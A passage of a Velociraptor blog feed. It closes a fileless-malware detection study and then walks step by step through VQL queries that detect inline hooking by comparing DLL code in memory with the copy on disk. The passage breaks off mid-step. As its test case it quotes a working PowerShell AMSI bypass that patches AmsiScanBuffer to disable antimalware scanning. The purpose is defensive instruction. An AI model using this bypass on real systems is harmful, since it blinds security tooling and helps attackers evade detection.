+used by Velociraptor, it could still hide itself from &lt;code&gt;Mem2Disk&lt;/code&gt;. We
+also observed that some of the false negatives ran pretty quickly, so
+we suspect that they were already finished when Velociraptor ran.&lt;/p&gt;
+&lt;p&gt;Lastly, there are legitimate tools - likely security tools - using
+similar functionalities, which would create false positives. We have
+not encountered them, since we do not have licenses for most of these
+tools, but analysts should be aware that security tools can trigger
+&lt;code&gt;Mem2Disk&lt;/code&gt; detections.&lt;/p&gt;
+&lt;h2 id="62-comparison-to-other-tools"&gt;6.2. Comparison to Other Tools&lt;/h2&gt;
+&lt;p&gt;Volatility as the state-of-the-art memory forensics tool has a
+different focus to our implementation. Volatility aims to enable a
+forensic expert to deeply analyze one RAM dump. It does not scale to
+multiple RAMs and it relies mostly on the knowledge of the
+analyst. The most comparable plugin &lt;code&gt;malfind&lt;/code&gt; searches for executable
+(and writable) memory pages like &lt;code&gt;Mem2Disk&lt;/code&gt; however then analyzes
+those pages more thoroughly than &lt;code&gt;Mem2Disk&lt;/code&gt;. So, Volatility is more
+capable than &lt;code&gt;Mem2Disk&lt;/code&gt; but does not scale well.&lt;/p&gt;
+&lt;p&gt;MemProcFS per se is more of a RAM access tool than a RAM analysis
+tool. It enables the analyst to access the RAM through a browser but
+ultimately relies on the analyst to find malware with the exception of
+the &lt;code&gt;findevil&lt;/code&gt; plugin. It is work in progress and currently only
+detects user-mode malware. It is comparable to Volatility, provides
+more options than &lt;code&gt;Mem2Disk&lt;/code&gt; but cannot be executed on multiple
+machines easily.&lt;/p&gt;
+&lt;p&gt;Hollows Hunter and PE-sieve are the most comparable tools to
+&lt;code&gt;Mem2Disk&lt;/code&gt;. They employ a variety of techniques to detect malware on
+one system and are more capable and in-depth than &lt;code&gt;Mem2Disk&lt;/code&gt;. Hollows
+Hunter can also be executed via Velociraptor with the
+&lt;a href="https://docs.velociraptor.app/exchange/artifacts/pages/hollowshunter/" target="_blank" &gt;Windows.Memory.HollowsHunter&lt;/a&gt;
+
+plugin and scales to multiple machines.&lt;/p&gt;
+&lt;p&gt;In contrast to &lt;code&gt;Windows.Memory.HollowsHunter&lt;/code&gt;, &lt;code&gt;Mem2Disk&lt;/code&gt; is a
+Velociraptor-native plugin fully written in VQL and benefits from the
+parallelization of Velociraptor. No additional binary has to be
+uploaded to the client machines (unlike
+&lt;code&gt;Windows.Memory.HollowsHunter&lt;/code&gt;), which also means Velociraptor can
+regulate the CPU load of &lt;code&gt;Mem2Disk&lt;/code&gt;. As already mentioned, detections
+usually ran within 1-5 minutes, mostly in under a minute depending on
+the system hardware. Therefore, the performance overhead of &lt;code&gt;Mem2Disk&lt;/code&gt;
+seems acceptable in a normal company network. Anti-virus scans in
+comparison would take considerable more time and are generally
+accepted.&lt;/p&gt;
+&lt;p&gt;In summary, &lt;code&gt;Mem2Disk&lt;/code&gt; is useful for breadth search. For example when
+not knowing if or where fileless malware hides within a full network
+of more than a few machines. When analyzing known-compromised machines
+or only a few suspicious machines, the other mentioned tools give more
+details than &lt;code&gt;Mem2Disk&lt;/code&gt; and should be preferred.&lt;/p&gt;
+&lt;h1 id="7-conclusion"&gt;7. Conclusion&lt;/h1&gt;
+&lt;p&gt;All in all, the blue team just stepped up. We are able to detect injected
+implants of common C2 frameworks live in RAM and scalable to thousands of
+machines in nearly real-time.&lt;/p&gt;
+&lt;p&gt;We also recommend memory forensics experts to think about scalability
+of their tools. Velociraptor enables memory forensics on multiple
+machines without dumping the RAM.&lt;/p&gt;
+&lt;p&gt;Happy detecting!&lt;/p&gt;
+&lt;h1 id="8-acknowledgement"&gt;8. Acknowledgement&lt;/h1&gt;
+&lt;p&gt;We would like to express our gratitude to Prof. Nicolas Wolovick for
+supporting this publication with advice and guidance and to Mike Cohen
+for improving our VQL code, giving feedback on the blog post as well
+as helping us understand the connection between &lt;code&gt;RVA&lt;/code&gt;, &lt;code&gt;BaseOfData&lt;/code&gt;
+and &lt;code&gt;ASLR&lt;/code&gt;.&lt;/p&gt;</description></item><item><title>Memory Analysis with Velociraptor - Part 1</title><link>https://docs.velociraptor.app/blog/2025/2025-11-15-memory-analysis-pt1/</link><pubDate>Fri, 14 Nov 2025 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2025/2025-11-15-memory-analysis-pt1/</guid><description>&lt;p&gt;This post was spurred by the recent release of the
+&lt;a href="https://docs.velociraptor.app/exchange/artifacts/pages/windows.memory.mem2disk/" &gt;Windows.Memory.Mem2Disk&lt;/a&gt;
+ artifact,
+written by Lautaro Lecumberry and Dr. Michael Denzel. The artifact was
+a culmination of their excellent thesis, &lt;a href="https://github.com/lautarolecumberry/DetectingFilelessMalware" target="_blank" &gt;Detecting Fileless Malware
+using Endpoint Detection and Response
+Tools&lt;/a&gt;
+. You
+should check it out!&lt;/p&gt;
+&lt;p&gt;Memory analysis is a powerful technique used in DFIR to detect malware
+and persistence mechanisms which are sometimes not detectable using
+more conventional disk based methods.&lt;/p&gt;
+&lt;p&gt;Over the years, frameworks like
+&lt;a href="https://github.com/volatilityfoundation/volatility3" target="_blank" &gt;Volatility&lt;/a&gt;
+ or
+&lt;a href="https://github.com/ufrisk/MemProcFS" target="_blank" &gt;MemprocFS&lt;/a&gt;
+ have become the
+standard go-to tools when analysts think of memory analysis. Those
+frameworks usually operate on a static image of physical memory.&lt;/p&gt;
+&lt;p&gt;However, this has a number of shortcoming when performing active
+response in modern environments:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;In order to obtain the physical memory image (for example, using a
+tool like &lt;a href="https://github.com/Velocidex/WinPmem" target="_blank" &gt;WinPmem&lt;/a&gt;
+) one
+usually needs to load a kernel driver. On hardened endpoints this
+is not always possible, presenting challenges in actually obtaining
+memory images.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The size of physical memory is very large in modern systems. Most
+consumer laptops now regularly ship with 16Gb of physical RAM and
+most server class machines have memory sizes in the range of 128Gb
+to 1Tb of Physical RAM.&lt;/p&gt;
+&lt;p&gt;A larger RAM size presents challenges for analysis. First, the size
+of the image makes it difficult to store and transport across the
+network. Additionally, the image quality is usually poor due to a
+larger amount of memory smear exasperated during the longer
+acquisition time - making subsequent memory analysis unreliable.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Physical memory images are actually not a very good format for
+acquiring the state of the endpoint. This is because operating
+systems use virtual memory and on demand paging. For example, while
+in theory one can dump binaries from running memory using
+e.g. Volatility&amp;rsquo;s &lt;code&gt;procdump&lt;/code&gt; plugin, in reality the dumped binaries
+are missing many executable pages, which are not memory
+resident. Instead the operating system will page those binary
+instructions from disk at runtime, if they are needed.&lt;/p&gt;
+&lt;p&gt;Therefore capturing physical memory, even if done perfectly and
+without smear, will miss many parts of those things we actually
+need to extract in our analysis - such as binaries, or user data
+(which may be in the page file), etc.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;Velociraptor&amp;rsquo;s memory analysis capabilities do not rely on physical memory.&lt;/strong&gt;
+Although Velociraptor does have the ability to capture a physical memory image
+(e.g. using the
+&lt;a href="https://docs.velociraptor.app/artifact_references/pages/windows.memory.acquisition/" &gt;Windows.Memory.Acquisition&lt;/a&gt;
+
+artifact), we don&amp;rsquo;t recommend this approach. Much of Velociraptor&amp;rsquo;s memory
+capabilities are implemented using plugins which directly query the operating
+system for information about the system (including process memory).&lt;/p&gt;
+&lt;p&gt;Many of Velociraptor&amp;rsquo;s memory analysis plugins have equivalent or
+similar plugins in Volatility. Using these plugins allows Velociraptor
+to perform similar analysis to many of Volatility&amp;rsquo;s native physical
+memory analysis modules.&lt;/p&gt;
+&lt;p&gt;However, Velociraptor&amp;rsquo;s approach is faster and more scalable since it
+does not need to acquire an image first, and can get perfect
+information as needed. For example, when dumping a binary from memory,
+we automatically cause the OS to page in non-resident pages (simply by
+virtue of reading the page through the API), so the end binary dump is
+perfect and far better than we could get from a physical memory image.&lt;/p&gt;
+&lt;p&gt;This blog post is the first in a series of posts describing
+Velociraptor&amp;rsquo;s approach to memory analysis. In each post I will
+compare and contrast Velociraptor&amp;rsquo;s approach to other memory analysis
+frameworks. In particular I will dive into the VQL queries that are
+used to develop such artifacts in order to share my development
+process and point out some of the lesser known capabilities.&lt;/p&gt;
+&lt;p&gt;My goal is to convince you to think of Velociraptor&amp;rsquo;s memory analysis
+capability as the &lt;strong&gt;first&lt;/strong&gt; port of call when developing new memory-based
+detections! It is far more practical than writing a single use python
+script, and it can be deployed quickly and at scale.&lt;/p&gt;
+&lt;p&gt;In this post I will discuss how to detect inline hooking. There are
+many open source tools which implement this kind of detection (for
+example &lt;a href="https://github.com/hasherezade/hollows_hunter" target="_blank" &gt;Hollows
+Hunter&lt;/a&gt;
+ which you can
+use with Velociraptor via the &lt;a href="https://docs.velociraptor.app/exchange/artifacts/pages/hollowshunter/" &gt;Windows.Memory.HollowsHunter&lt;/a&gt;
+ artifact). In this
+post I will describe how this can be implemented purely in VQL.&lt;/p&gt;
+&lt;h1 id="inline-hooking-of-binaries"&gt;Inline hooking of binaries&lt;/h1&gt;
+&lt;p&gt;Inline hooking is a popular technique for subverting a binary by
+patching the function header as it is loaded into memory. For example,
+patching ETW tracing functionality can disable user space ETW reporting,
+such as PowerShell script block logging.&lt;/p&gt;
+&lt;p&gt;It is also possible to patch functions in &lt;a href="https://attack.mitre.org/techniques/T1056/004/" target="_blank" &gt;other
+processes&lt;/a&gt;
+, thereby
+subverting them by diverting execution to attacker-controlled code
+injections.&lt;/p&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-11-15-memory-analysis-pt1//blog/2025/2025-11-15-memory-analysis-pt1/patching_memory_.svg" alt="Patching a function preamble"
+ class="inline"
+ height="774.8870281243326"
+ width="1331.1480712890623" /&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="patching_memory.svg"&gt;&lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Patching a function preamble
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;The process is illustrated above. When a DLL is loaded into memory,
+the OS maps its text section (i.e. the actual code of the functions it
+exports) into the process&amp;rsquo;s virtual memory. Normally calling these
+functions causes execution to jump into the function body. However,
+the attacker may want to prevent calling some functions. Therefore,
+they can simply overwrite the front of the function with a return
+instruction causing the function to be bypassed.&lt;/p&gt;
+&lt;p&gt;To illustrate this technique, let&amp;rsquo;s examine the following short
+powershell snippet:
+&lt;a href="https://github.com/okankurtuluss/AMSIBypassPatch/blob/090b54a518fecf1ccf8f54f8691805ef0f9a30f1/AMSIBypassPatch.ps1" target="_blank" &gt;AMSIBypassPatch.ps1&lt;/a&gt;
+&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;function Disable-Protection {
+ $k = @&amp;quot;
+using System;
+using System.Runtime.InteropServices;
+public class P {
+ [DllImport(&amp;quot;kernel32.dll&amp;quot;)]
+ public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+ [DllImport(&amp;quot;kernel32.dll&amp;quot;)]
+ public static extern IntPtr GetModuleHandle(string lpModuleName);
+ [DllImport(&amp;quot;kernel32.dll&amp;quot;)]
+ public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+ public static bool Patch() {
+ IntPtr h = GetModuleHandle(&amp;quot;a&amp;quot; + &amp;quot;m&amp;quot; + &amp;quot;s&amp;quot; + &amp;quot;i&amp;quot; + &amp;quot;.dll&amp;quot;);
+ if (h == IntPtr.Zero) return false;
+ IntPtr a = GetProcAddress(h, &amp;quot;A&amp;quot; + &amp;quot;m&amp;quot; + &amp;quot;s&amp;quot; + &amp;quot;i&amp;quot; + &amp;quot;S&amp;quot; + &amp;quot;c&amp;quot; + &amp;quot;a&amp;quot; + &amp;quot;n&amp;quot; + &amp;quot;B&amp;quot; + &amp;quot;u&amp;quot; + &amp;quot;f&amp;quot; + &amp;quot;f&amp;quot; + &amp;quot;e&amp;quot; + &amp;quot;r&amp;quot;);
+ if (a == IntPtr.Zero) return false;
+ UInt32 oldProtect;
+ if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;
+ byte[] patch = { 0x31, 0xC0, 0xC3 };
+ Marshal.Copy(patch, 0, a, patch.Length);
+ return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);
+ }
+}
+&amp;quot;@
+ Add-Type -TypeDefinition $k
+ $result = [P]::Patch()
+ if ($result) {
+ Write-Output &amp;quot;Protection Disabled&amp;quot;
+ } else {
+ Write-Output &amp;quot;Failed to Disable Protection&amp;quot;
+ }
+}
+
+Disable-Protection
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This code prevents calling &lt;code&gt;AmsiScanBuffer&lt;/code&gt; used to scan PowerShell
+code for suspicious constructs:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;It gets a handle to the &lt;code&gt;amsi.dll&lt;/code&gt; library.&lt;/li&gt;
+&lt;li&gt;It then finds the &lt;code&gt;AmsiScanBuffer&lt;/code&gt; function.&lt;/li&gt;
+&lt;li&gt;Changes the page protections on the function to allow writing on
+the memory.&lt;/li&gt;
+&lt;li&gt;Overwrites the memory with a return op code&lt;/li&gt;
+&lt;li&gt;Changes memory protections back.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;You can use this example while reading the following post.&lt;/p&gt;
+&lt;h1 id="how-can-we-detect-memory-patching"&gt;How can we detect memory patching?&lt;/h1&gt;
+&lt;p&gt;The main indicator for memory patching is that the code resident in
+memory is not the same as the code of the DLL on disk. So the approach
+here is to compare the code in memory with the code on disk for each
+DLL.&lt;/p&gt;
+&lt;p&gt;I will develop the following in a notebook cell which I am launching
+on a Windows system using &lt;a href="https://docs.velociraptor.app/docs/deployment/#instant-velociraptor" &gt;Instant Velociraptor&lt;/a&gt;
+. This approach allows me
+to interactively develop my VQL on a live system in the convenience of
+a GUI notebook without needing to call into a remote client. See
+&lt;a href="https://docs.velociraptor.app/docs/artifacts/tips/" &gt;Artifact Writing Tips &lt;/a&gt;
+ for more
+details.&lt;/p&gt;
+&lt;p&gt;In a separate window I start powershell, and paste the above code into
+it. This will patch &lt;code&gt;amsi.dll&lt;/code&gt; so I can use it as a test to develop my
+VQL.&lt;/p&gt;
+&lt;h2 id="step-1-enumerate-processes-of-interest"&gt;Step 1: Enumerate processes of interest&lt;/h2&gt;
+&lt;p&gt;First I list all the processes and identify the powershell process.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-vql"&gt;SELECT * FROM pslist()
+WHERE Name =~ &amp;quot;powershell&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-11-15-memory-analysis-pt1//blog/2025/2025-11-15-memory-analysis-pt1/pslist.png"
+ class="inline"
+ alt="Filtering processes by name"
+ width="920" height="386"&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="pslist.png"&gt;
+ &lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Filtering processes by name
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;The &lt;a href="https://docs.velociraptor.app/vql_reference/popular/pslist/" &gt;pslist()&lt;/a&gt;
+ VQL
+plugin is similar to Volatility&amp;rsquo;s &lt;code&gt;pslist&lt;/code&gt; plugin - it simply lists
+all active processes and reveals important information about them.&lt;/p&gt;
+&lt;p&gt;In this case, I am interested in the process ID (Pid) of the
+powershell process. I want to use that to see all dll&amp;rsquo;s mapped into
+the powershell process&amp;rsquo;s address space.&lt;/p&gt;
+&lt;h2 id="step-2-finding-mapped-dlls"&gt;Step 2: Finding mapped Dlls&lt;/h2&gt;
+&lt;p&gt;I am especially interested in how this process is mapping the
+&lt;code&gt;amsi.dll&lt;/code&gt;. Executable dlls are normally mapped into a process address
+space by the kernel when the dll is loaded. I can view the mapped
+sections of a process using the &lt;a href="https://docs.velociraptor.app/vql_reference/windows/vad/" &gt;vad()&lt;/a&gt;
+ VQL plugin. This plugin is
+equivalent to Volatility&amp;rsquo;s &lt;code&gt;vad&lt;/code&gt; plugin, and produces a list of all
+mapped sections in the process. If the section is backed by a file
+then the filename is also given, as well as the memory protections of
+the region.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-vql"&gt;SELECT * FROM foreach(row={
+ SELECT * FROM pslist()
+ WHERE Name =~ &amp;quot;powershell&amp;quot;
+}, query={
+ SELECT Pid, Name, *
+ FROM vad(pid=Pid)
+ WHERE MappingName =~ &amp;quot;amsi.dll&amp;quot;
+})
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-11-15-memory-analysis-pt1//blog/2025/2025-11-15-memory-analysis-pt1/inspecting_vad_.svg" alt="Inspecting the dlls mapped into the process address space"
+ class="inline"
+ height="541"
+ width="1283.030303030303" /&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="inspecting_vad.svg"&gt;&lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Inspecting the dlls mapped into the process address space
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;As we see above, the region with &lt;code&gt;PAGE_EXECUTE_READ&lt;/code&gt; protections which
+is backed by the &lt;code&gt;amsi.dll&lt;/code&gt; is the one containing the actual code
+exported by the DLL.&lt;/p&gt;
+&lt;p&gt;So our goal is to find the same dll on disk and compare the bytes in
+memory with the bytes on disk.&lt;/p&gt;
+&lt;h2 id="step-3-convert-from-kernel-paths-to-filesystem-paths"&gt;Step 3: Convert from kernel paths to filesystem paths&lt;/h2&gt;
+&lt;p&gt;However, as you can see, the Windows kernel reports the mapping
+filename in kernel path conventions:
+&lt;code&gt;\Device\HarddiskVolume3\Windows\System32\amsi.dll&lt;/code&gt; referring to the
+kernel&amp;rsquo;s internal device manager path. We can not use this path to
+directly open the file on disk.&lt;/p&gt;
+&lt;p&gt;Somehow, we need to convert &lt;code&gt;\Device\HarddiskVolume3\&lt;/code&gt; to &lt;code&gt;C:\&lt;/code&gt;. The
+conversion is actually done by the Kernel&amp;rsquo;s object manager depending
+on how the volumes are mounted at the moment. The &lt;code&gt;C:\&lt;/code&gt; drive letter
+is simply a symbolic link to the real path as far as the kernel is
+concerned.&lt;/p&gt;
+&lt;p&gt;Luckily we can inspect the content of the kernel object manager using
+the &lt;a href="https://docs.velociraptor.app/vql_reference/windows/winobj/" &gt;winobj()&lt;/a&gt;
+
+plugin. This is the VQL equivalent of Volatility&amp;rsquo;s &lt;code&gt;winobj&lt;/code&gt; plugin. It
+shows the kernel&amp;rsquo;s object manager namespace.&lt;/p&gt;
+&lt;p&gt;I won&amp;rsquo;t get into too much detail, but the following VQL code
+translates from kernel paths into file paths using the object manager
+namespace. I just paste this code in my notebook and call it as
+&lt;code&gt;DriveReplace(Path)&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-vql"&gt;-- These functions help to resolve the Kernel Device Filenames
+-- into a regular filename with drive letter.
+LET DriveReplaceLookup &amp;lt;= SELECT
+ split(sep_string=&amp;quot;\\&amp;quot;, string=Name)[-1] AS Drive,
+ upcase(string=SymlinkTarget) AS Target,
+ len(list=SymlinkTarget) AS Len
+ FROM winobj()
+ WHERE Name =~ &amp;quot;^\\\\GLOBAL\\?\\?\\\\.:&amp;quot;
+
+LET _DriveReplace(Path) = SELECT Drive + Path[Len:] AS ResolvedPath
+ FROM DriveReplaceLookup
+ WHERE upcase(string=Path[:Len]) = Target
+
+LET DriveReplace(Path) = _DriveReplace(Path=Path)[0].ResolvedPath || Path
+
+SELECT *
+FROM foreach(row={
+ SELECT * FROM pslist()
+ WHERE Name =~ &amp;quot;powershell&amp;quot;
+}, query={
+ SELECT Pid, Name, DriveReplace(Path=MappingName) AS DllName, *
+ FROM vad(pid=Pid)
+ WHERE MappingName =~ &amp;quot;amsi.dll&amp;quot;
+})
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id="step-4-parsing-the-dll-from-disk"&gt;Step 4: parsing the DLL from disk&lt;/h2&gt;
+&lt;p&gt;In our artifact we would rather just import those utility functions
+from a common artifact (these functions are actually provided by the
+&lt;code&gt;Windows.System.VAD&lt;/code&gt; artifact). In this way VQL allows us to
+modularize artifacts and reuse code.&lt;/p&gt;
+&lt;p&gt;I also want to format the address in hexadecimal and parse the dll
+from disk using the &lt;a href="https://docs.velociraptor.app/vql_reference/parsers/parse_pe/" &gt;parse_pe()&lt;/a&gt;
+ plugin.&lt;/p&gt;
+&lt;p&gt;Putting it all together:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-vql"&gt;LET _ &amp;lt;= import(artifact=&amp;quot;Windows.System.VAD&amp;quot;)
+LET Hex(X) = format(format=&amp;quot;%#x&amp;quot;, args=X)
+
+SELECT * FROM foreach(row={
+ SELECT *
+ FROM pslist()
+ WHERE Name =~ &amp;quot;powershell&amp;quot;
+ },
+ query={
+ SELECT Pid, Name, Hex(X=Address) AS Address,
+ DriveReplace(Path=MappingName) AS Dll,
+ parse_pe(file=DriveReplace(Path=MappingName)) AS PEInfo, *
+ FROM vad(pid=Pid)
+ WHERE MappingName =~ &amp;quot;amsi&amp;quot; AND ProtectionMsg =~ &amp;quot;PAGE_EXECUTE_READ&amp;quot;
+ })
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-11-15-memory-analysis-pt1//blog/2025/2025-11-15-memory-analysis-pt1/parsing_the_pe_file_.svg" alt="Parsing the mapped DLL from disk"
+ class="inline"
+ height="606"
+ width="1285.127436281859" /&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="parsing_the_pe_file.svg"&gt;&lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Parsing the mapped DLL from disk
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;In the above we see some important information:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;The code of &lt;code&gt;amsi.dll&lt;/code&gt; is mapped into the process at virtual
+address &lt;code&gt;0x7ff945181000&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;By parsing the sections from the dll on disk we can tell the code section named &lt;code&gt;.text&lt;/code&gt; :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Has a file offset of 4096 bytes inside the PE file.&lt;/li&gt;
+&lt;li&gt;The Virtual Memory address preferred by the DLL is 6442455040&lt;/li&gt;
+&lt;li&gt;The Relative Virtual Address of the text section is 4096. This is
+relative address (from the DLL load offset) where this section
+starts.&lt;/li&gt;
+&lt;li&gt;The size of the section is 73728 bytes.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Although the DLL wants to be loaded at a preferred virtual memory
+address of 6442455040, windows does not actually load at this
+address. Instead it is loaded at 0x7ff945181000. This is because
+Windows tries to randomize the address space by shifting the loading
+location of the dll to a random start location.&lt;/p&gt;
+&lt;p&gt;This is called the ASLR shift (Address space layout
+randomization). Let&amp;rsquo;s visualize how it looks in memory:&lt;/p&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-11-15-memory-analysis-pt1//blog/2025/2025-11-15-memory-analysis-pt1/memory_vs_disk_.svg" alt="Comparing memory mapped dll to disk offsets"
+ class="inline"
+ height="889.1666666666665"
+ width="1878.333333333333" /&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="memory_vs_disk.svg"&gt;&lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Comparing memory mapped dll to disk offsets
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s extract the interesting fields from the &lt;code&gt;.text&lt;/code&gt; section by
+writing a VQL function to locate the &lt;code&gt;.text&lt;/code&gt; section from a DLL on
+disk:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-vql"&gt;-- Filter all the PE sections to find the .text section
+LET GetTextSegment(Path) = filter(
+ condition=&amp;quot;x=&amp;gt;x.Name = '.text'&amp;quot;,
+ list=parse_pe(file=Path).Sections)[0]
+
+LET Sections = SELECT Pid, Name, Address, Dll,
+ GetTextSegment(Path=Dll) AS TextSegment
+FROM foreach(row={
+ SELECT * FROM pslist()
+ WHERE Name =~ &amp;quot;powershell&amp;quot;
+ }, query={
+ SELECT Pid, Name, Address,
+ DriveReplace(Path=MappingName) AS Dll, *
+ FROM vad(pid=Pid)
+ WHERE MappingName =~ &amp;quot;amsi&amp;quot;
+ AND ProtectionMsg =~ &amp;quot;PAGE_EXECUTE_READ&amp;quot;
+ })
+
+SELECT *,
+ Hex(X=Address) AS Address,
+ Hex(X=Address - TextSegment.VMA) AS ASLR
+FROM Sections
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-11-15-memory-analysis-pt1//blog/2025/2025-11-15-memory-analysis-pt1/essential_info.png"
+ class="inline"
+ alt="Isolating the essential information"
+ width="1589" height="434"&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="essential_info.png"&gt;
+ &lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Isolating the essential information
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;The above query calculates the ASLR offset, and gets the essential
+information for the &lt;code&gt;.text&lt;/code&gt; section.&lt;/p&gt;
+&lt;h2 id="step-5-comparing-the-memory-regions-with-the-disk"&gt;Step 5: Comparing the memory regions with the disk&lt;/h2&gt;
+&lt;p&gt;Now I will read the &lt;code&gt;.text&lt;/code&gt; section from disk and memory. Velociraptor
+allows to read process memory using the &lt;a href="https://docs.velociraptor.app/vql_reference/accessors/process/" &gt;process accessor&lt;/a&gt;
+. The accessor makes the
+process memory appear as a huge file, so we can apply any VQL function
+or plugin which expects a file directly on process memory.&lt;/p&gt;
+&lt;p&gt;This is useful, for example, in applying the &lt;code&gt;yara()&lt;/code&gt; plugin to scan
+memory for patterns. However, in this case I just want to read the
+&lt;code&gt;.text&lt;/code&gt; section and compare it with the file on disk. I can use the
+&lt;a href="https://docs.velociraptor.app/vql_reference/popular/read_file/" &gt;read_file()&lt;/a&gt;
+ VQL
+function to just read the file into a single buffer string (Note that
+when using the process accessor the filename must be of the form
+&lt;code&gt;/&amp;lt;pid&amp;gt;&lt;/code&gt;):&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;LET PidAsString(Pid) = format(format=&amp;quot;/%d&amp;quot;, args=Pid)
+
+SELECT *,
+ Hex(X=Address) AS Address,
+ Hex(X=Address - TextSegment.VMA) AS ASLR,
+ read_file(offset=TextSegment.FileOffset,
+ length=TextSegment.Size,
+ filename=Dll) AS DiskData,
+ read_file(offset=Address,
+ length=TextSegment.Size,
+ accessor=&amp;quot;process&amp;quot;,
+ filename=PidAsString(Pid=Pid)) AS MemoryData
+FROM Sections
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-11-15-memory-analysis-pt1//blog/2025/2025-11-15-memory-analysis-pt1/reading_process_memory.png"
+ class="inline"
+ alt="Reading process memory and code from disk"
+ width="1584" height="400"&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="reading_process_memory.png"&gt;
+ &lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Reading process memory and code from disk
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;h2 id="step-6-comparing-memory-to-disk"&gt;Step 6: Comparing memory to disk&lt;/h2&gt;
+&lt;p&gt;Next I need to compare the &lt;code&gt;MemoryData&lt;/code&gt; and &lt;code&gt;DiskData&lt;/code&gt;. I can start
+with a naive implementation which compares 8 bytes at the time (This
+will be too slow on larger DLLs but for this example it should be fast
